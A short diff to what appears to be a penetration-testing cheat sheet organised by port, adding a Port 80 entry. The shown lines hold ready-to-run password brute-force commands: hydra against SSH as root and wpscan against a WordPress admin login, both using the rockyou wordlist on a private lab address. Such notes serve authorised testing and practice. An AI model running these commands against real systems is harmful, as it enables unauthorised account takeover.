@@ -56,6 +56,12 @@ hydra -s 22 -v -t 4 -l root -P /usr/share/wordlists/rockyou.txt 10.0.0.1 ssh
 
 
 ## Port 25
+
+## Port 80
+```
+wpscan --url http://10.0.0.1/ --passwords /usr/share/wordlists/rockyou.txt --usernames admin --api-token {toekn-api}
+```
+
 ## Port 110
 ## Port 111
 ```
